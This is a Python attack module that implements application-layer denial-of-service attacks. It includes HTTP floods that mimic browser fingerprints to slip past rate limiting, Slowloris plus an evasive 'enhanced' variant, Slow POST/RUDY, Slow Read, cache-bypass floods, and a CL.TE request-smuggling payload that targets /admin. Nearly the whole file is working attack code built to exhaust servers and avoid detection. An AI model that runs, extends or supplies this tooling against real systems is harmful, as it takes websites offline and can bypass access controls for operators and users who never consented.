"""
Layer 7 (Application Layer) Attack Module

Implements sophisticated HTTP/HTTPS attacks:
- HTTP Flood with browser mimicry
- Slowloris (slow headers)
- Slow POST (R.U.D.Y.)
- HTTP Request Smuggling
- Cache bypass attacks
"""

import asyncio
import aiohttp
import random
import string
import time
import ssl
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from collections import deque
import logging

logger = logging.getLogger(__name__)


# Realistic browser fingerprints
BROWSER_FINGERPRINTS = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    },
    {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
    },
]

# Common referrers
REFERRERS = [
    'https://www.google.com/',
    'https://www.google.com/search?q=',
    'https://www.bing.com/search?q=',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.linkedin.com/',
    'https://www.reddit.com/',
    'https://news.ycombinator.com/',
]

# Common paths to request
COMMON_PATHS = [
    '/', '/index.html', '/index.php', '/home', '/about',
    '/contact', '/products', '/services', '/api/v1/status',
    '/search', '/login', '/register', '/cart', '/checkout',
]


@dataclass
class Layer7Config:
    """Configuration for Layer 7 attacks"""
    target: str
    port: int = 80
    ssl: bool = False
    duration: int = 60
    connections: int = 100
    rate_limit: int = 0  # 0 = unlimited
    paths: List[str] = field(default_factory=lambda: COMMON_PATHS.copy())
    custom_headers: Dict[str, str] = field(default_factory=dict)
    use_browser_fingerprint: bool = True
    randomize_path: bool = True
    follow_redirects: bool = False


@dataclass
class Layer7Stats:
    """Statistics for Layer 7 attacks"""
    requests_sent: int = 0
    successful: int = 0
    failed: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    response_codes: Dict[int, int] = field(default_factory=dict)
    avg_response_time: float = 0.0
    start_time: float = field(default_factory=time.time)
    
    def record_response(self, code: int, response_time: float, bytes_recv: int):
        self.response_codes[code] = self.response_codes.get(code, 0) + 1
        if 200 <= code < 400:
            self.successful += 1
        else:
            self.failed += 1
        self.bytes_received += bytes_recv
        # Update average
        total = self.successful + self.failed
        self.avg_response_time = (self.avg_response_time * (total - 1) + response_time) / total


class Layer7Attack(ABC):
    """Base class for Layer 7 attacks"""
    
    def __init__(self, config: Layer7Config):
        self.config = config
        self.stats = Layer7Stats()
        self._running = False
        
    @abstractmethod
    async def attack(self):
        """Execute the attack"""
        pass
    
    async def start(self):
        """Start the attack"""
        self._running = True
        self.stats = Layer7Stats()
        
        logger.info(f"Starting Layer 7 attack on {self.config.target}:{self.config.port}")
        
        try:
            await asyncio.wait_for(self.attack(), timeout=self.config.duration)
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            logger.error(f"Attack error: {e}")
            
        self._running = False
        
    async def stop(self):
        """Stop the attack"""
        self._running = False
        
    def _get_headers(self) -> Dict[str, str]:
        """Get randomized headers"""
        if self.config.use_browser_fingerprint:
            headers = random.choice(BROWSER_FINGERPRINTS).copy()
        else:
            headers = {}
            
        # Add essential headers
        headers['Host'] = f"{self.config.target}:{self.config.port}" if self.config.port not in (80, 443) else self.config.target
        
        # Add referrer
        if random.random() < 0.7:
            headers['Referer'] = random.choice(REFERRERS)
            
        # Add custom headers
        headers.update(self.config.custom_headers)
        
        # Add cache-busting
        headers['X-Request-ID'] = ''.join(random.choices(string.hexdigits, k=16))
        
        return headers
        
    def _get_path(self) -> str:
        """Get randomized path"""
        if self.config.randomize_path:
            path = random.choice(self.config.paths)
            # Add random query params
            if random.random() < 0.5:
                params = '&'.join(f"{random.choice(string.ascii_lowercase)}={random.randint(1,1000)}" 
                                 for _ in range(random.randint(1, 3)))
                path += f"?{params}"
            return path
        return self.config.paths[0] if self.config.paths else '/'
        
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        elapsed = time.time() - self.stats.start_time
        return {
            'requests_sent': self.stats.requests_sent,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'rps': self.stats.requests_sent / elapsed if elapsed > 0 else 0,
            'bytes_sent': self.stats.bytes_sent,
            'bytes_received': self.stats.bytes_received,
            'avg_response_time': self.stats.avg_response_time,
            'response_codes': self.stats.response_codes,
        }


class HTTPFlood(Layer7Attack):
    """
    HTTP Flood Attack
    
    High-volume HTTP requests with browser mimicry.
    Bypasses simple rate limiting with realistic fingerprints.
    Supports HTTP/1.1, HTTP/2, and HTTP/3 protocols.
    """
    
    def __init__(self, config: Layer7Config, http_version: str = "1.1"):
        super().__init__(config)
        self.http_version = http_version
        
    async def attack(self):
        """Execute HTTP flood with protocol selection"""
        if self.http_version == "2":
            await self._http2_flood()
        elif self.http_version == "3":
            await self._http3_flood()
        else:
            await self._http1_flood()
            
    async def _http1_flood(self):
        """HTTP/1.1 flood attack"""
        protocol = 'https' if self.config.ssl else 'http'
        base_url = f"{protocol}://{self.config.target}:{self.config.port}"
        
        # Create connection pool
        connector = aiohttp.TCPConnector(
            limit=self.config.connections,
            limit_per_host=self.config.connections,
            ssl=False if not self.config.ssl else None
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._http1_worker(session, base_url))
                tasks.append(task)
                
            await asyncio.gather(*tasks, return_exceptions=True)
            
    async def _http1_worker(self, session: aiohttp.ClientSession, base_url: str):
        """HTTP/1.1 worker sending requests"""
        while self._running:
            try:
                # Randomize request method
                method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
                url = base_url + self._get_path()
                headers = self._get_headers()
                
                # Add POST data if needed
                data = None
                if method == 'POST':
                    data = self._generate_post_data()
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
                start = time.monotonic()
                async with session.request(
                    method,
                    url, 
                    headers=headers,
                    data=data,
                    allow_redirects=self.config.follow_redirects,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    elapsed = time.monotonic() - start
                    body = await response.read()
                    
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(data) if data else 0
                    self.stats.record_response(response.status, elapsed, len(body))
                    
            except Exception as e:
                self.stats.failed += 1
                
            # Rate limiting
            if self.config.rate_limit > 0:
                await asyncio.sleep(1.0 / self.config.rate_limit)
                
    async def _http2_flood(self):
        """HTTP/2 multiplexed flood attack"""
        try:
            import httpx
            
            protocol = 'https' if self.config.ssl else 'http'
            base_url = f"{protocol}://{self.config.target}:{self.config.port}"
            
            logger.info(f"Starting HTTP/2 multiplexed flood on {base_url}")
            
            # Create fewer connections but multiplex many streams
            connection_count = min(self.config.connections // 10, 50)  # Fewer connections for HTTP/2
            streams_per_connection = self.config.connections // connection_count
            
            tasks = []
            for _ in range(connection_count):
                task = asyncio.create_task(self._http2_worker(base_url, streams_per_connection))
                tasks.append(task)
                
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except ImportError:
            logger.warning("httpx not available for HTTP/2 support, falling back to HTTP/1.1")
            await self._http1_flood()
            
    async def _http2_worker(self, base_url: str, streams_per_connection: int):
        """HTTP/2 worker with multiplexed streams"""
        import httpx
        
        async with httpx.AsyncClient(
            http2=True,
            verify=False,
            timeout=httpx.Timeout(10.0)
        ) as client:
            while self._running:
                try:
                    # Create multiple concurrent streams
                    stream_tasks = []
                    for _ in range(streams_per_connection):
                        url = base_url + self._get_path()
                        headers = self._get_headers()
                        
                        # Randomize HTTP/2 specific features
                        method = random.choice(['GET', 'POST'])
                        if method == 'POST':
                            data = self._generate_post_data()
                            stream_tasks.append(client.post(url, headers=headers, data=data))
                        else:
                            stream_tasks.append(client.get(url, headers=headers))
                    
                    # Execute all streams concurrently (HTTP/2 multiplexing)
                    start = time.monotonic()
                    results = await asyncio.gather(*stream_tasks, return_exceptions=True)
                    elapsed = time.monotonic() - start
                    
                    # Process results
                    for result in results:
                        self.stats.requests_sent += 1
                        if isinstance(result, httpx.Response):
                            self.stats.record_response(result.status_code, elapsed, len(result.content))
                        else:
                            self.stats.failed += 1
                            
                except Exception as e:
                    logger.debug(f"HTTP/2 stream error: {e}")
                    self.stats.failed += streams_per_connection
                    
                # Rate limiting
                if self.config.rate_limit > 0:
                    await asyncio.sleep(streams_per_connection / self.config.rate_limit)
                    
    async def _http3_flood(self):
        """HTTP/3 QUIC-based flood attack"""
        try:
            import httpx
            
            protocol = 'https'  # HTTP/3 requires HTTPS
            base_url = f"{protocol}://{self.config.target}:{self.config.port}"
            
            logger.info(f"Starting HTTP/3 QUIC flood on {base_url}")
            
            # HTTP/3 uses QUIC which is UDP-based and multiplexed
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._http3_worker(base_url))
                tasks.append(task)
                
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except ImportError:
            logger.warning("HTTP/3 support not available, falling back to HTTP/2")
            await self._http2_flood()
            
    async def _http3_worker(self, base_url: str):
        """HTTP/3 QUIC worker"""
        import httpx
        
        # Note: HTTP/3 support in httpx is experimental
        # This is a placeholder for when full HTTP/3 support is available
        async with httpx.AsyncClient(
            http2=True,  # Use HTTP/2 as fallback until HTTP/3 is stable
            verify=False,
            timeout=httpx.Timeout(10.0)
        ) as client:
            while self._running:
                try:
                    url = base_url + self._get_path()
                    headers = self._get_headers()
                    
                    # Add HTTP/3 specific headers
                    headers['Alt-Svc'] = 'h3=":443"'
                    
                    method = random.choice(['GET', 'POST'])
                    start = time.monotonic()
                    
                    if method == 'POST':
                        data = self._generate_post_data()
                        response = await client.post(url, headers=headers, data=data)
                    else:
                        response = await client.get(url, headers=headers)
                        
                    elapsed = time.monotonic() - start
                    
                    self.stats.requests_sent += 1
                    self.stats.record_response(response.status_code, elapsed, len(response.content))
                    
                except Exception as e:
                    logger.debug(f"HTTP/3 request error: {e}")
                    self.stats.failed += 1
                    
                # Rate limiting
                if self.config.rate_limit > 0:
                    await asyncio.sleep(1.0 / self.config.rate_limit)
                    
    def _generate_post_data(self) -> str:
        """Generate random POST data"""
        fields = []
        for i in range(random.randint(3, 8)):
            key = f"field{i}"
            value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 50)))
            fields.append(f"{key}={value}")
        return '&'.join(fields)


class SlowlorisAttack(Layer7Attack):
    """
    Slowloris Attack
    
    Keeps connections open by slowly sending headers.
    Exhausts server connection pool.
    """
    
    def __init__(self, config: Layer7Config, header_delay: float = 10.0):
        super().__init__(config)
        self.header_delay = header_delay
        self._sockets = []
        
    async def attack(self):
        """Execute Slowloris attack"""
        # Create initial connections
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._slow_connection())
            tasks.append(task)
            
        await asyncio.gather(*tasks, return_exceptions=True)
        
    async def _slow_connection(self):
        """Maintain a slow connection"""
        while self._running:
            try:
                # Open connection
                if self.config.ssl:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port, ssl=ssl_context
                    )
                else:
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port
                    )
                
                # Send partial request
                path = self._get_path()
                headers = self._get_headers()
                
                # Initial request line
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.config.target}\r\n"
                
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                    
                writer.write(request.encode())
                await writer.drain()
                
                self.stats.requests_sent += 1
                
                # Keep sending headers slowly
                while self._running:
                    # Send a partial header
                    fake_header = f"X-Slowloris-{random.randint(1000,9999)}: {random.randint(1,1000)}\r\n"
                    writer.write(fake_header.encode())
                    await writer.drain()
                    
                    self.stats.bytes_sent += len(fake_header)
                    
                    await asyncio.sleep(self.header_delay)
                    
            except Exception as e:
                self.stats.failed += 1
                await asyncio.sleep(1)  # Reconnect delay


class SlowPOST(Layer7Attack):
    """
    Slow POST (R.U.D.Y.) Attack
    
    Sends POST requests with very slow body transmission.
    Keeps server waiting for complete request.
    """
    
    def __init__(self, config: Layer7Config, body_delay: float = 10.0, 
                 content_length: int = 100000):
        super().__init__(config)
        self.body_delay = body_delay
        self.content_length = content_length
        
    async def attack(self):
        """Execute Slow POST attack"""
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._slow_post())
            tasks.append(task)
            
        await asyncio.gather(*tasks, return_exceptions=True)
        
    async def _slow_post(self):
        """Maintain a slow POST connection"""
        while self._running:
            try:
                if self.config.ssl:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port, ssl=ssl_context
                    )
                else:
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port
                    )
                
                # Send POST request with large Content-Length
                path = self._get_path()
                headers = self._get_headers()
                
                request = f"POST {path} HTTP/1.1\r\n"
                request += f"Host: {self.config.target}\r\n"
                request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                request += f"Content-Length: {self.content_length}\r\n"
                
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                    
                request += "\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                self.stats.requests_sent += 1
                
                # Send body very slowly
                bytes_sent = 0
                while self._running and bytes_sent < self.content_length:
                    # Send one byte at a time
                    writer.write(b'A')
                    await writer.drain()
                    bytes_sent += 1
                    self.stats.bytes_sent += 1
                    
                    await asyncio.sleep(self.body_delay)
                    
            except Exception as e:
                self.stats.failed += 1
                await asyncio.sleep(1)


class RUDYAttack(SlowPOST):
    """
    R.U.D.Y. (R-U-Dead-Yet) Attack
    
    Alias for Slow POST attack.
    """
    pass


class SlowReadAttack(Layer7Attack):
    """
    Slow Read Attack
    
    Establishes connections and reads responses very slowly.
    Exhausts server resources by keeping connections open.
    """
    
    def __init__(self, config: Layer7Config, read_delay: float = 5.0, 
                 read_size: int = 1):
        super().__init__(config)
        self.read_delay = read_delay
        self.read_size = read_size
        
    async def attack(self):
        """Execute Slow Read attack"""
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._slow_read_connection())
            tasks.append(task)
            
        await asyncio.gather(*tasks, return_exceptions=True)
        
    async def _slow_read_connection(self):
        """Maintain a slow reading connection"""
        while self._running:
            try:
                if self.config.ssl:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port, ssl=ssl_context
                    )
                else:
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port
                    )
                
                # Send normal HTTP request
                path = self._get_path()
                headers = self._get_headers()
                
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.config.target}\r\n"
                
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                    
                request += "\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(request)
                
                # Read response very slowly
                total_read = 0
                while self._running:
                    try:
                        # Read only a few bytes at a time
                        data = await asyncio.wait_for(
                            reader.read(self.read_size), 
                            timeout=1.0
                        )
                        
                        if not data:
                            break
                            
                        total_read += len(data)
                        self.stats.bytes_received += len(data)
                        
                        # Wait before reading more
                        await asyncio.sleep(self.read_delay)
                        
                    except asyncio.TimeoutError:
                        # No more data available
                        break
                        
                writer.close()
                await writer.wait_closed()
                
                if total_read > 0:
                    self.stats.successful += 1
                else:
                    self.stats.failed += 1
                    
            except Exception as e:
                logger.debug(f"Slow read connection error: {e}")
                self.stats.failed += 1
                await asyncio.sleep(1)  # Reconnect delay


class EnhancedSlowloris(SlowlorisAttack):
    """
    Enhanced Slowloris Attack
    
    Improved version with better evasion and persistence.
    """
    
    def __init__(self, config: Layer7Config, header_delay: float = 10.0,
                 randomize_headers: bool = True):
        super().__init__(config, header_delay)
        self.randomize_headers = randomize_headers
        
    async def _slow_connection(self):
        """Enhanced slow connection with better evasion"""
        while self._running:
            try:
                # Open connection
                if self.config.ssl:
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port, ssl=ssl_context
                    )
                else:
                    reader, writer = await asyncio.open_connection(
                        self.config.target, self.config.port
                    )
                
                # Send partial request with randomized elements
                path = self._get_path()
                headers = self._get_headers()
                
                # Initial request line
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.config.target}\r\n"
                
                # Send some real headers first
                essential_headers = ['User-Agent', 'Accept', 'Accept-Language']
                for header_name in essential_headers:
                    if header_name in headers:
                        request += f"{header_name}: {headers[header_name]}\r\n"
                        
                writer.write(request.encode())
                await writer.drain()
                
                self.stats.requests_sent += 1
                
                # Keep sending headers slowly with randomization
                header_count = 0
                while self._running and header_count < 50:  # Limit headers to avoid detection
                    if self.randomize_headers:
                        # Send randomized headers
                        fake_headers = [
                            f"X-Forwarded-For: 192.168.{random.randint(1,254)}.{random.randint(1,254)}",
                            f"X-Real-IP: 10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                            f"X-Request-ID: {random.randint(100000,999999)}",
                            f"X-Session-ID: {random.randint(1000000,9999999)}",
                            f"Cache-Control: max-age={random.randint(0,3600)}",
                            f"Accept-Charset: utf-8,iso-8859-1;q={random.uniform(0.1,0.9):.1f}",
                        ]
                        fake_header = random.choice(fake_headers)
                    else:
                        fake_header = f"X-Slowloris-{random.randint(1000,9999)}: {random.randint(1,1000)}"
                    
                    fake_header += "\r\n"
                    writer.write(fake_header.encode())
                    await writer.drain()
                    
                    self.stats.bytes_sent += len(fake_header)
                    header_count += 1
                    
                    # Randomize delay to avoid pattern detection
                    delay = self.header_delay + random.uniform(-2, 2)
                    await asyncio.sleep(max(1, delay))
                    
            except Exception as e:
                logger.debug(f"Enhanced Slowloris connection error: {e}")
                self.stats.failed += 1
                await asyncio.sleep(random.uniform(1, 3))  # Randomized reconnect delay


class CacheBypass(Layer7Attack):
    """
    Cache Bypass Attack
    
    Generates unique requests to bypass caching layers.
    Forces origin server to handle every request.
    """
    
    async def attack(self):
        """Execute cache bypass attack"""
        protocol = 'https' if self.config.ssl else 'http'
        base_url = f"{protocol}://{self.config.target}:{self.config.port}"
        
        connector = aiohttp.TCPConnector(
            limit=self.config.connections,
            ssl=False if not self.config.ssl else None
        )
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(self.config.connections):
                task = asyncio.create_task(self._worker(session, base_url))
                tasks.append(task)
            await asyncio.gather(*tasks, return_exceptions=True)
            
    async def _worker(self, session: aiohttp.ClientSession, base_url: str):
        """Worker with cache-busting requests"""
        while self._running:
            try:
                # Generate unique URL
                path = self._get_path()
                cache_buster = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
                
                if '?' in path:
                    url = f"{base_url}{path}&_cb={cache_buster}&_t={time.time()}"
                else:
                    url = f"{base_url}{path}?_cb={cache_buster}&_t={time.time()}"
                
                headers = self._get_headers()
                # Add cache-control headers
                headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
                headers['Pragma'] = 'no-cache'
                headers['Expires'] = '0'
                
                start = time.monotonic()
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    elapsed = time.monotonic() - start
                    body = await response.read()
                    
                    self.stats.requests_sent += 1
                    self.stats.record_response(response.status, elapsed, len(body))
                    
            except Exception:
                self.stats.failed += 1


class HTTPSmuggling(Layer7Attack):
    """
    HTTP Request Smuggling Attack
    
    Exploits differences in how front-end and back-end servers
    parse HTTP requests. Can bypass security controls.
    
    WARNING: This is for security testing only.
    """
    
    async def attack(self):
        """Execute HTTP smuggling attack"""
        tasks = []
        for _ in range(self.config.connections):
            task = asyncio.create_task(self._smuggle())
            tasks.append(task)
        await asyncio.gather(*tasks, return_exceptions=True)
        
    async def _smuggle(self):
        """Send smuggled requests"""
        while self._running:
            try:
                reader, writer = await asyncio.open_connection(
                    self.config.target, self.config.port
                )
                
                # CL.TE smuggling attempt
                smuggled = self._build_clte_smuggle()
                writer.write(smuggled)
                await writer.drain()
                
                self.stats.requests_sent += 1
                self.stats.bytes_sent += len(smuggled)
                
                # Read response
                try:
                    response = await asyncio.wait_for(reader.read(4096), timeout=5)
                    self.stats.bytes_received += len(response)
                except asyncio.TimeoutError:
                    pass
                    
                writer.close()
                await writer.wait_closed()
                
            except Exception:
                self.stats.failed += 1
                
            await asyncio.sleep(0.1)
            
    def _build_clte_smuggle(self) -> bytes:
        """Build CL.TE smuggling payload"""
        # This exploits servers that prioritize Content-Length over Transfer-Encoding
        smuggled_request = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.config.target}\r\n"
            f"X-Smuggled: true\r\n"
            f"\r\n"
        )
        
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.config.target}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled_request) + 4}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_request}"
        )
        
        return payload.encode()
